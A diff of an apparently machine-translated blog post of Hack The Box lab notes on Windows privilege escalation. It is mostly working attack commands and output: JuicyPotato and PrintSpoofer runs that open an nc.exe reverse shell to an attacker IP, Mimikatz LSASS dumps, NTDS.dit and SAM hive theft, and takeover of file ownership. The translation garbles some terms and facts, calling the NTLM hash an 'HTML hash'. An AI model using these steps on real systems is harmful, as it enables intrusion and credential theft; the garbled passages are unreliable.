+<p>In order to take advantage of these permissions to escalate privileges, first download <code>JuicyPotato.exe</code> binary file and upload it, and <code>nc.exe</code> to the target server. Next, create a Netcat listener on port 8443 and execute the following command, where <code>-l</code> is the COM server listening port,<code>-p</code> Is the startup program (cmd.exe),<code>-a</code> are the parameters passed to cmd.exe,<code>-t</code> Yes <code>createprocess</code> call. Below, we tell the tool to try both<a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw" rel="noreferrer" target="_blank">CreateProcessWithTokenW</a> and<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera" rel="noreferrer" target="_blank">CreateProcessAsUser</a> function, both of which require <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> permissions.</p>
 <ol><li>Escalating Privileges Using JuicyPotato</li></ol>
 <pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.38 8443 -e cmd.exe" -t *
 
@@ -3937,7 +3937,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
 {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
 [+] CreateProcessWithTokenW OK                                                     
 [+] calling 0x000000000088ce08</code></pre>
-<p>This process completed successfully and received a message named<code>NT AUTHORITY\SYSTEM</code> shell.</p>
+<p>This process completed successfully and received a message named <code>NT AUTHORITY\SYSTEM</code> shell.</p>
 <ol><li>Catching SYSTEM Shell</li></ol>
 <pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ sudo nc -lnvp 8443
 
@@ -3957,8 +3957,8 @@ C:\Windows\system32&gt;hostname
 
 hostname
 WINLPE-SRV01</code></pre>
-<p><strong>PringSpoofer and RoguePotato</strong> JuicyPotato does not support Windows Server 2019 and Windows 10 version 1809 and later. However,<a href="https://github.com/itm4n/PrintSpoofer" rel="noreferrer" target="_blank">PrintSpoofer</a> and<a href="https://github.com/antonioCoco/RoguePotato" rel="noreferrer" target="_blank">RoguePotato</a> You can also use the same permissions to obtain<code>NT AUTHORITY\SYSTEM</code>level of access. This blog post goes into depth<code>PrintSpoofer</code> Tool that can be used to abuse impersonation permissions on Windows 10 and Server 2019 hosts, JuicyPotato no longer works properly.</p>
-<p>Let's use<code>PrintSpoofer</code> Try the tool. We can use this tool to spawn and interact with a SYSTEM process in your current console, spawn a SYSTEM process on the desktop (if logged in locally or via RDP), or capture a reverse shell - which we will do in our example. Likewise, connect<code>mssqlclient.py</code>, use with<code>-c</code> Parameters for the tool execution command. Here, use<code>nc.exe</code> Generate a reverse shell (Netcat listener waiting for our attack box on port 8443).</p>
+<p><strong>PringSpoofer and RoguePotato</strong> JuicyPotato does not support Windows Server 2019 and Windows 10 version 1809 and later. However,<a href="https://github.com/itm4n/PrintSpoofer" rel="noreferrer" target="_blank">PrintSpoofer</a> and<a href="https://github.com/antonioCoco/RoguePotato" rel="noreferrer" target="_blank">RoguePotato</a> You can also use the same permissions to obtain <code>NT AUTHORITY\SYSTEM</code> level of access. This blog post goes into depth <code>PrintSpoofer</code> Tool that can be used to abuse impersonation permissions on Windows 10 and Server 2019 hosts, JuicyPotato no longer works properly.</p>
+<p>Let's use <code>PrintSpoofer</code> Try the tool. We can use this tool to spawn and interact with a SYSTEM process in your current console, spawn a SYSTEM process on the desktop (if logged in locally or via RDP), or capture a reverse shell - which we will do in our example. Likewise, connect <code>mssqlclient.py</code>, use with <code>-c</code> Parameters for the tool execution command. Here, use <code>nc.exe</code> Generate a reverse shell (Netcat listener waiting for our attack box on port 8443).</p>
 <ol><li>Escalating Privilege using PrintSpoofer</li></ol>
 <pre><code class="language-shell-session">SQL&gt; xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.38 8443 -e cmd"
 
@@ -3988,10 +3988,10 @@ C:\Windows\system32&gt;whoami
 whoami
 nt authority\system</code></pre>
 <h3>SeDebugPrivilege debugging permissions</h3>
-<p>Users may be assigned in order to run a specific application or service or to assist with troubleshooting<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs" rel="noreferrer" target="_blank">SeDebugPrivilege</a>, instead of adding the account to the Administrators group. This permission can be set through local or domain group policy in<code>Computer Settings &gt; Windows Settings &gt; Security Settings</code>. By default, only administrators have this permission, as it can be used to capture sensitive information from system memory, or to access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their daily work. This user right should be granted with caution, as any assigned account will have access to critical operating system components.</p>
-<p>In internal penetration testing, it is often helpful to utilize sites such as LinkedIn to gather information about potential users for targeting purposes. Assume we are using<code>Responder</code> or<code>Inveigh</code> Get many NTLMv2 password hashes. In this case, we might want to focus our efforts to crack password hashes on potentially high-value accounts, such as developers who are more likely to be assigned such permissions. A user may not be a local administrator of the host, but have rights that we cannot enumerate remotely with tools like BloodHound. This is worth checking in an environment where we are obtaining credentials for multiple users and have RDP access to one or more hosts but no additional permissions.</p>
+<p>Users may be assigned in order to run a specific application or service or to assist with troubleshooting<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs" rel="noreferrer" target="_blank">SeDebugPrivilege</a>, instead of adding the account to the Administrators group. This permission can be set through local or domain group policy in <code>Computer Settings &gt; Windows Settings &gt; Security Settings</code>. By default, only administrators have this permission, as it can be used to capture sensitive information from system memory, or to access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their daily work. This user right should be granted with caution, as any assigned account will have access to critical operating system components.</p>
+<p>In internal penetration testing, it is often helpful to utilize sites such as LinkedIn to gather information about potential users for targeting purposes. Assume we are using <code>Responder</code> or <code>Inveigh</code> Get many NTLMv2 password hashes. In this case, we might want to focus our efforts to crack password hashes on potentially high-value accounts, such as developers who are more likely to be assigned such permissions. A user may not be a local administrator of the host, but have rights that we cannot enumerate remotely with tools like BloodHound. This is worth checking in an environment where we are obtaining credentials for multiple users and have RDP access to one or more hosts but no additional permissions.</p>
 <img alt="Pasted image 20260228032219" src="assets/posts/windows-privilege-escalation/Pasted image 20260228032219.png"/>
-<p>As assigned to debug<code>programs</code>After logging in as a user with privileges and opening an elevated shell, we see<code>SeDebugPrivilege</code> be listed.</p>
+<p>As assigned to debug <code>programs</code> After logging in as a user with privileges and opening an elevated shell, we see <code>SeDebugPrivilege</code> be listed.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; whoami /priv
 
 PRIVILEGES INFORMATION
@@ -4013,7 +4013,7 @@ Sysinternals - www.sysinternals.com
 [15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
 [15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
 [15:25:46] Dump count reached.</code></pre>
-<p>This worked and we can<code>Mimikatz</code> used in<code>sekurlsa:: minidump</code> The command loads. sending<code>sekurlsa:: logonPasswords</code> command, we obtained the NTLM hash of the local administrator account logged in locally. We can exploit this method to conduct a "pass the hash" attack, if the same local administrator password is used on one or more additional systems (common in large organizations), allowing for lateral movement.</p>
+<p>This worked and we can <code>Mimikatz</code> used in <code>sekurlsa:: minidump</code> The command loads. sending <code>sekurlsa:: logonPasswords</code> command, we obtained the NTLM hash of the local administrator account logged in locally. We can exploit this method to conduct a "pass the hash" attack, if the same local administrator password is used on one or more additional systems (common in large organizations), allowing for lateral movement.</p>
 <p>Note: Before running any command in "Mimikatz", it is best to enter "log" first, so that all command output will generate a ".txt" file. This is especially useful when exporting credentials from a server where multiple sets of credentials may exist.</p>
 <pre><code class="language-cmd-session">C:\htb&gt; mimikatz.exe.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` (benjamin@gentilkiwi.com )
@@ -4075,12 +4075,12 @@ SID: S-1-5-21-3769161915-3336846931-3985975925-1000
         credman:
 
 &lt;SNIP&gt;</code></pre>
-<p>Let's say we are unable to load the tool on the target for some reason, but have RDP access. In this case we can manually dump via Task Manager<code>LSASS</code> process by browsing "<code>Details</code> " label, select<code>LSASS</code> process and select<code>Create dump file</code>. After downloading this file back to the attack system, we can process it with Mimikatz, just like in the previous example.</p>
+<p>Let's say we are unable to load the tool on the target for some reason, but have RDP access. In this case we can manually dump via Task Manager <code>LSASS</code> process by browsing "<code>Details</code> " label, select <code>LSASS</code> process and select <code>Create dump file</code>. After downloading this file back to the attack system, we can process it with Mimikatz, just like in the previous example.</p>
 <img alt="Pasted image 20260228035858" src="assets/posts/windows-privilege-escalation/Pasted image 20260228035858.png"/>
-<p><strong>First use procdump.exe to run the lsass.exe program, then dump the dump file to the same directory as mimikatz.exe, and run mimikatz.exe. After executing these three commands<code>log</code> <code>sekurlsa::minidump lsass.dmp</code> <code>sekurlsa::logonpasswords</code>, you can get the HTML hash</strong></p>
-<p><strong>Remote code execution as SYSTEM</strong> We can also use<code>SeDebugPrivilege</code> to realize<a href="https://decoder.cloud/2018/02/02/getting-system/" rel="noreferrer" target="_blank">RCE</a>. Using this technique, we can start a subprocess by<code>SeDebugPrivilege</code>Grant elevated privileges to the account, alter normal system behavior, inherit the token of the parent process and impersonate it, thereby elevating privileges to SYSTEM. If we run the parent process as SYSTEM (specifying the target process or the process ID (or PID) of the running program, then we can quickly escalate privileges. Let's see it in action.</p>
-<p>First, transfer this PoC script to the target system. Next we just load the script and use the following syntax<code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,"")</code> run. Note that we have to add a third empty parameter at the end<code>""</code>, so that the PoC can work properly.</p>
-<p>First, open an elevated PowerShell console (right-click, run as administrator, enter<code>Jordan</code> user's credentials). Next, enter<code>tasklist</code>, gets a list of running processes and their associated PIDs.</p>
+<p><strong>First use procdump.exe to run the lsass.exe program, then dump the dump file to the same directory as mimikatz.exe, and run mimikatz.exe. After executing these three commands <code>log</code> <code>sekurlsa::minidump lsass.dmp</code> <code>sekurlsa::logonpasswords</code>, you can get the HTML hash</strong></p>
+<p><strong>Remote code execution as SYSTEM</strong> We can also use <code>SeDebugPrivilege</code> to realize<a href="https://decoder.cloud/2018/02/02/getting-system/" rel="noreferrer" target="_blank">RCE</a>. Using this technique, we can start a subprocess by <code>SeDebugPrivilege</code> Grant elevated privileges to the account, alter normal system behavior, inherit the token of the parent process and impersonate it, thereby elevating privileges to SYSTEM. If we run the parent process as SYSTEM (specifying the target process or the process ID (or PID) of the running program, then we can quickly escalate privileges. Let's see it in action.</p>
+<p>First, transfer this PoC script to the target system. Next we just load the script and use the following syntax <code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,"")</code> run. Note that we have to add a third empty parameter at the end <code>""</code>, so that the PoC can work properly.</p>
+<p>First, open an elevated PowerShell console (right-click, run as administrator, enter <code>Jordan</code> user's credentials). Next, enter <code>tasklist</code>, gets a list of running processes and their associated PIDs.</p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; tasklist 
 
 Image Name                     PID Session Name        Session#    Mem Usage
@@ -4095,9 +4095,9 @@ winlogon.exe                   612 Console                    1     10,408 K</co
 <p>Here we can target the system running under PID 612<code>winlogon.exe</code>, we know it runs as SYSTEM on the Windows host.</p>
 <p>We can also use<a href="https://docs.microsoft.com/en-us/PowerShell/module/microsoft.PowerShell.management/get-process?view=PowerShell-7.2" rel="noreferrer" target="_blank">Get-Process</a> The cmdlet grabs the PID of a well-known process (such as LSASS) and passes it directly to the script, reducing the number of steps required.</p>
 <img alt="Pasted image 20260228040031" src="assets/posts/windows-privilege-escalation/Pasted image 20260228040031.png"/>
-<p>There are also tools like this, which can be found in our<code>SeDebugPrivilege</code> The SYSTEM shell pops up. Typically we don't have access to the host via RDP, so the PoC must be modified, either by reverse shelling back to the attacking host as SYSTEM, or via other commands, such as adding an admin user. Try playing around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you don't have a fully interactive session, such as implementing command injection, or as<code>SeDebugPrivilege</code> of users have a web shell or reverse shell connection. Keep these examples in mind in case you run into a situation where dumping LSASS fails to obtain useful credentials (although we can gain SYSTEM access via the machine's NTLM hash, but that's beyond the scope of this module), and using a shell or RCE as SYSTEM can be helpful.</p>
+<p>There are also tools like this, which can be found in our <code>SeDebugPrivilege</code> The SYSTEM shell pops up. Typically we don't have access to the host via RDP, so the PoC must be modified, either by reverse shelling back to the attacking host as SYSTEM, or via other commands, such as adding an admin user. Try playing around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you don't have a fully interactive session, such as implementing command injection, or as <code>SeDebugPrivilege</code> of users have a web shell or reverse shell connection. Keep these examples in mind in case you run into a situation where dumping LSASS fails to obtain useful credentials (although we can gain SYSTEM access via the machine's NTLM hash, but that's beyond the scope of this module), and using a shell or RCE as SYSTEM can be helpful.</p>
 <h3>SeTakeOwnershipPrivilege Get ownership permissions</h3>
-<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects" rel="noreferrer" target="_blank">SeTakeOwnershipPrivilege</a> Give users ownership of any "protectable object", i.e. Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This permission is given to<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights" rel="noreferrer" target="_blank">WRITE_OWNER</a> Rights on an object, meaning the user can change the owner within the object's security descriptor. Administrators are granted this permission by default. While it is rare to encounter a standard user account with this permission, we may encounter, for example, a service account that is given this permission and is responsible for running backup jobs and VSS snapshots. It may also be assigned to some other account, such as<code>SeBackupPrivilege</code>、<code>SeRestorePrivilege</code> and<code>SeSecurityPrivilege</code>, to control the account's permissions more granularly without giving the account full local administrator rights. These privileges themselves may well be used to escalate privileges. However, sometimes we may be responsible for a specific file because other methods are blocked, or other methods don't work as expected. There's something special about abusing that privilege. Still, it's worth the in-depth understanding, especially since in an Active Directory environment we may encounter a scenario where we can assign this right to a specific user and use it to read sensitive files on a file share.</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects" rel="noreferrer" target="_blank">SeTakeOwnershipPrivilege</a> Give users ownership of any "protectable object", i.e. Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes. This permission is given to<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights" rel="noreferrer" target="_blank">WRITE_OWNER</a> Rights on an object, meaning the user can change the owner within the object's security descriptor. Administrators are granted this permission by default. While it is rare to encounter a standard user account with this permission, we may encounter, for example, a service account that is given this permission and is responsible for running backup jobs and VSS snapshots. It may also be assigned to some other account, such as <code>SeBackupPrivilege</code>、<code>SeRestorePrivilege</code> and <code>SeSecurityPrivilege</code>, to control the account's permissions more granularly without giving the account full local administrator rights. These privileges themselves may well be used to escalate privileges. However, sometimes we may be responsible for a specific file because other methods are blocked, or other methods don't work as expected. There's something special about abusing that privilege. Still, it's worth the in-depth understanding, especially since in an Active Directory environment we may encounter a scenario where we can assign this right to a specific user and use it to read sensitive files on a file share.</p>
 <p><strong>WRITE_OWNER permission</strong> means:</p>
 <blockquote>You can modify the object's Owner field.</blockquote>
 <p>Pay attention to a key logic:<strong>Windows has a hidden rule:</strong> <strong>The owner of the object has natural rights to modify the DACL.</strong> So the attack chain is:</p>
@@ -4108,7 +4108,7 @@ winlogon.exe                   612 Console                    1     10,408 K</co
 <p><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></p>
 <ul><li><code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></li></ul>
 <img alt="Pasted image 20260228044443" src="assets/posts/windows-privilege-escalation/Pasted image 20260228044443.png"/>
-<p>With this permission, the user can take ownership of any file or object and perform operations involving sensitive data access,<code>remote code execution</code>  (<code>RCE</code>) or<code>denial of service</code> (DOS) changes.</p>
+<p>With this permission, the user can take ownership of any file or object and perform operations involving sensitive data access,<code>remote code execution</code>  (<code>RCE</code>) or <code>denial of service</code> (DOS) changes.</p>
 <p>Suppose we encounter a user with this permission, or by using<a href="https://github.com/FSecureLABS/SharpGPOAbuse" rel="noreferrer" target="_blank">SharpGPOAbuse</a> Attacks such as GPO abuse grant this permission. In this case, we can use this permission to control shared folders or sensitive files, such as documents containing passwords or SSH keys.</p>
 <p><strong>Leveraging the Privilege</strong></p>
 <ol><li>Review current user permissions</li></ol>
@@ -4142,9 +4142,9 @@ PS C:\TakeOwn&gt; type flag.txt
 1m_th3_f1l3_0wn3r_n0W!
 PS C:\TakeOwn&gt;
 </code></pre>
-<p>Next, select a target file and confirm current ownership. For our purposes, we'll be targeting an interesting file found on a file share. Common files<code>Sharing is public</code>and<code>private</code>Directory, with subdirectories set up by departments. Given a user's role in the company, they often have access to specific files or directories. Even with such a structure in place, system administrators can misconfigure directory and subdirectory permissions, making file shares a rich source of information for us to obtain Active Directory credentials (sometimes even without credentials). In our scenario, let’s assume we have access to the target company’s file share and can freely browse<code>private</code>and<code>public</code>subdirectory. In most cases, we found that permissions were set very restrictively and no information about file sharing was found.<code>public</code>section has any interesting information. Browsing<code>private</code>section, we found that all domain users could list the contents of certain subdirectories, but when trying to read the contents of most files received<code>access denied</code>tips. During the enumeration process, we<code>private</code>shared folder<code>IT</code> A file named<code>cred.txt</code> file.</p>
+<p>Next, select a target file and confirm current ownership. For our purposes, we'll be targeting an interesting file found on a file share. Common files <code>Sharing is public</code> and <code>private</code> Directory, with subdirectories set up by departments. Given a user's role in the company, they often have access to specific files or directories. Even with such a structure in place, system administrators can misconfigure directory and subdirectory permissions, making file shares a rich source of information for us to obtain Active Directory credentials (sometimes even without credentials). In our scenario, let’s assume we have access to the target company’s file share and can freely browse <code>private</code> and <code>public</code> subdirectory. In most cases, we found that permissions were set very restrictively and no information about file sharing was found.<code>public</code> section has any interesting information. Browsing <code>private</code> section, we found that all domain users could list the contents of certain subdirectories, but when trying to read the contents of most files received <code>access denied</code> tips. During the enumeration process, we <code>private</code> shared folder <code>IT</code> A file named <code>cred.txt</code> file.</p>
 <ol><li>Select target file</li></ol>
-<p>Given that our user account has<code>SeTakeOwnershipPrivilege</code>(may have been granted), or we exploited other misconfiguration, such as an overly permissive Group Policy Object (GPO) granting that permission), we could exploit it to read arbitrary files.</p>
+<p>Given that our user account has <code>SeTakeOwnershipPrivilege</code>(may have been granted), or we exploited other misconfiguration, such as an overly permissive Group Policy Object (GPO) granting that permission), we could exploit it to read arbitrary files.</p>
 <p>Let’s take a look at our target profile to get more relevant information.</p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
  
@@ -4165,7 +4165,7 @@ C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive</code>
 06/18/2021  12:23 PM                36...                    cred.txt
                1 File(s)             36 bytes
                2 Dir(s)  17,079,754,752 bytes free</code></pre>
-<p>We can see that the IT share appears to belong to a service account and does contain a file<code>cred.txt</code> There is some data in it.</p>
+<p>We can see that the IT share appears to belong to a service account and does contain a file <code>cred.txt</code> There is some data in it.</p>
 <p>Now we can use<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown" rel="noreferrer" target="_blank">Takeown</a> Windows binary to change the ownership of a file.</p>
 <ol><li>Take over ownership of files</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; takeown /f 'C:\Department Shares\Private\IT\cred.txt'
@@ -4178,7 +4178,7 @@ SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now ow
 Name     Directory                       Owner
 ----     ---------                       -----
 cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student</code></pre>
-<p>We may still be unable to read the file and need to use<code>ICACL</code> Modify the file ACL to read.</p>
+<p>We may still be unable to read the file and need to use <code>ICACL</code> Modify the file ACL to read.</p>
 <ol><li>Modify the ACL of the file</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'
 
@@ -4214,17 +4214,17 @@ root:n1X_p0wer_us3er!</code></pre>
 %WINDIR%\system32\config\system.sav</code></pre>
 <h2>Windows group permissions</h2>
 <p><strong>Windows Built-in</strong></p>
-<p>Such as<code>Windows permissions overview</code>As mentioned in the section, Windows servers, especially domain controllers, have various groups built into them that either come with the operating system or are added when the system installs the Active Directory Domain Services role to promote the server to a domain controller. Many of these organizations grant members special privileges, and some can even be used to elevate the privileges of a server or domain controller. All built-in Windows groups are listed here with a detailed description of each group. This page details the list of privileged accounts and groups in Active Directory. Regardless of whether we have access to one or more of these member accounts, or during the evaluation process find ourselves with excessive/unnecessary membership in one or more of these groups, it is important to understand the impact of membership in these groups. For our purposes, we will focus on the following built-in groups. These groups have existed since Server 2008 R2 to the present day, except for Hyper-V Administrators (introduced in Server 2012).</p>
+<p>Such as <code>Windows permissions overview</code> As mentioned in the section, Windows servers, especially domain controllers, have various groups built into them that either come with the operating system or are added when the system installs the Active Directory Domain Services role to promote the server to a domain controller. Many of these organizations grant members special privileges, and some can even be used to elevate the privileges of a server or domain controller. All built-in Windows groups are listed here with a detailed description of each group. This page details the list of privileged accounts and groups in Active Directory. Regardless of whether we have access to one or more of these member accounts, or during the evaluation process find ourselves with excessive/unnecessary membership in one or more of these groups, it is important to understand the impact of membership in these groups. For our purposes, we will focus on the following built-in groups. These groups have existed since Server 2008 R2 to the present day, except for Hyper-V Administrators (introduced in Server 2012).</p>
 <p>Accounts can be assigned to these groups to enforce least privileges and avoid creating more domain administrators and enterprise administrators to perform specific tasks such as backups. Sometimes vendor apps also ask for certain permissions, which can be obtained by assigning the service account to one of these groups. Accounts can also be added accidentally, or left behind after testing a specific tool or script. We should always review these groups and append a list of each group member to the report for the client to review and determine whether access is still needed.</p>
 <div class="post-table-wrap"><table><thead><tr><th>Spare</th><th>event log reader</th><th>Administrator</th></tr></thead><tbody><tr><td>Administrator</td><td>Print</td><td>server operator</td></tr></tbody></table></div>
 <h3>Backup Operators Backup Operators</h3>
-<p>After logging into the target machine we can use the command<code>whoami /groups</code> Shows current group members. Members of this group will receive<code>SeBackup</code> and<code>SeRestore</code> privileges.<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges" rel="noreferrer" target="_blank">SeBackupPrivilege</a> Allows us to iterate through any folder and list the folder contents. This allows us to copy files from the folder even if there is no access control entry (ACE) in the folder's access control list (ACL). However, we cannot achieve this using the standard copy command. Instead, we need to programmatically copy the data and make sure to specify<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" rel="noreferrer" target="_blank">FILE_FLAG_BACKUP_SEMANTICS</a> logo.</p>
+<p>After logging into the target machine we can use the command <code>whoami /groups</code> Shows current group members. Members of this group will receive <code>SeBackup</code> and <code>SeRestore</code> privileges.<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges" rel="noreferrer" target="_blank">SeBackupPrivilege</a> Allows us to iterate through any folder and list the folder contents. This allows us to copy files from the folder even if there is no access control entry (ACE) in the folder's access control list (ACL). However, we cannot achieve this using the standard copy command. Instead, we need to programmatically copy the data and make sure to specify<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" rel="noreferrer" target="_blank">FILE_FLAG_BACKUP_SEMANTICS</a> logo.</p>
 <p><strong>How to access sensitive information without obtaining the necessary permissions.</strong></p>
-<p>we can use this<a href="https://github.com/giuliano108/SeBackupPrivilege" rel="noreferrer" target="_blank">PoC</a> to take advantage of<code>SeBackupPrivilege</code>, copy this file. First, let's import the library in a PowerShell session.</p>
+<p>we can use this<a href="https://github.com/giuliano108/SeBackupPrivilege" rel="noreferrer" target="_blank">PoC</a> to take advantage of <code>SeBackupPrivilege</code>, copy this file. First, let's import the library in a PowerShell session.</p>
 <ol><li>Importing Libraries</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module.\SeBackupPrivilegeUtils.dll
 PS C:\htb&gt; Import-Module.\SeBackupPrivilegeCmdLets.dll</code></pre>
-<p>Let's check if it's enabled<code>SeBackupPrivilege</code>, by calling<code>whoami /priv</code> or<code>Get-SeBackupPrivilege</code> cmdlet. If the permission is disabled, we can use<code>Set-SeBackupPrivilege</code> to enable it. &gt;Note: Depending on the server setup, it may be necessary to generate an elevated CMD prompt to bypass UAC and gain this permission.</p>
+<p>Let's check if it's enabled <code>SeBackupPrivilege</code>, by calling <code>whoami /priv</code> or <code>Get-SeBackupPrivilege</code> cmdlet. If the permission is disabled, we can use <code>Set-SeBackupPrivilege</code> to enable it. &gt;Note: Depending on the server setup, it may be necessary to generate an elevated CMD prompt to bypass UAC and gain this permission.</p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; whoami /priv
 
 PRIVILEGES INFORMATION
@@ -4241,7 +4241,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pr
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-SeBackupPrivilege
 
 SeBackupPrivilege is disabled</code></pre>
-<p>If the permission is disabled, we can use<code>Set-SeBackupPrivilege</code> to enable it.</p>
+<p>If the permission is disabled, we can use <code>Set-SeBackupPrivilege</code> to enable it.</p>
 <ol><li>Enabling SeBackupPrivilege</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Set-SeBackupPrivilege
 PS C:\htb&gt; Get-SeBackupPrivilege
@@ -4294,8 +4294,8 @@ Inlanefreight 2021 Contract
 Board of Directors:
 
 &lt;...SNIP...&gt;</code></pre>
-<p><strong>Attacking DC - Copying NTDS.dit</strong> This group also allows local logins to domain controllers. active directory database<code>NTDS.dit</code> is a very attractive target because it contains the NTLM hashes of all user and computer objects within the domain. However, the file is locked and inaccessible to non-privileged users.</p>
-<p>due to<code>NTDS.dit</code> Files are locked by default, we can use Windows'<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" rel="noreferrer" target="_blank">diskshadow</a> Tool creation<code>C</code> a shadow copy of the disk and expose it as<code>E</code> plate. NTDS.dit in this shadow copy will not be used by the system.</p>
+<p><strong>Attacking DC - Copying NTDS.dit</strong> This group also allows local logins to domain controllers. active directory database <code>NTDS.dit</code> is a very attractive target because it contains the NTLM hashes of all user and computer objects within the domain. However, the file is locked and inaccessible to non-privileged users.</p>
+<p>due to <code>NTDS.dit</code> Files are locked by default, we can use Windows'<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow" rel="noreferrer" target="_blank">diskshadow</a> Tool creation <code>C</code> a shadow copy of the disk and expose it as <code>E</code> plate. NTDS.dit in this shadow copy will not be used by the system.</p>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; diskshadow.exe
 
 Microsoft DiskShadow version 1.0
@@ -4328,14 +4328,14 @@ d-----        9/15/2018   2:06 AM                Program Files (x86)
 d-----         5/6/2021   1:05 PM                Tools
 d-r---         5/6/2021  12:51 PM                Users
 d-----        3/24/2021   6:38 PM                Windows</code></pre>
-<p>Next, we can use<code>Copy-FileSeBackupPrivilege</code> cmdlet bypasses the ACL and copies NTDS.dit locally.</p>
+<p>Next, we can use <code>Copy-FileSeBackupPrivilege</code> cmdlet bypasses the ACL and copies NTDS.dit locally.</p>
 <ol><li>Copying NTDS.dit Locally</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 
 Copied 16777216 bytes</code></pre>
 <p>&gt;SYSTEM Registry Hives: In Windows,<strong>Registry</strong> It is a hierarchical database used to store system configuration.</p>
 <ol><li>Back up SAM and SYSTEM Registry Hives</li></ol>
-<p>This permission also allows us to back up SAM and SYSTEM Registry Hives, using Impacket's<code>secretsdump.py</code> Use other tools to extract local account credentials offline</p>
+<p>This permission also allows us to back up SAM and SYSTEM Registry Hives, using Impacket's <code>secretsdump.py</code> Use other tools to extract local account credentials offline</p>
 <pre><code class="language-cmd-session">C:\htb&gt; reg save HKLM\SYSTEM SYSTEM.SAV
 
 The operation completed successfully.
@@ -4344,8 +4344,8 @@ The operation completed successfully.
 C:\htb&gt; reg save HKLM\SAM SAM.SAV
 
 The operation completed successfully.</code></pre>
-<p>It's worth noting that if a folder or file has an explicit deny access to the current user or a group they belong to, even if<code>FILE_FLAG_BACKUP_SEMANTICS</code> flag, will also prevent us from accessing the file.</p>
-<p>After extracting NTDS.dit, we can use<code>secretsdump.py</code> or PowerShell<code>DSInternals</code> Tools such as modules extract all Active Directory account credentials. We use<code>DSInternals</code> Get the domain name<code>administrator</code>The NTLM hash of the account.</p>
+<p>It's worth noting that if a folder or file has an explicit deny access to the current user or a group they belong to, even if <code>FILE_FLAG_BACKUP_SEMANTICS</code> flag, will also prevent us from accessing the file.</p>
+<p>After extracting NTDS.dit, we can use <code>secretsdump.py</code> or PowerShell <code>DSInternals</code> Tools such as modules extract all Active Directory account credentials. We use <code>DSInternals</code> Get the domain name <code>administrator</code> The NTLM hash of the account.</p>
 <ol><li>Extract credentials from NTDS.dit</li></ol>
 <pre><code class="language-PowerShell-session">PS C:\htb&gt; Import-Module.\DSInternals.psd1
 PS C:\htb&gt; $key = Get-BootKey -SystemHivePath.\SYSTEM
@@ -4410,7 +4410,7 @@ Credential Roaming
   Created:
   Modified:
   Credentials:</code></pre>
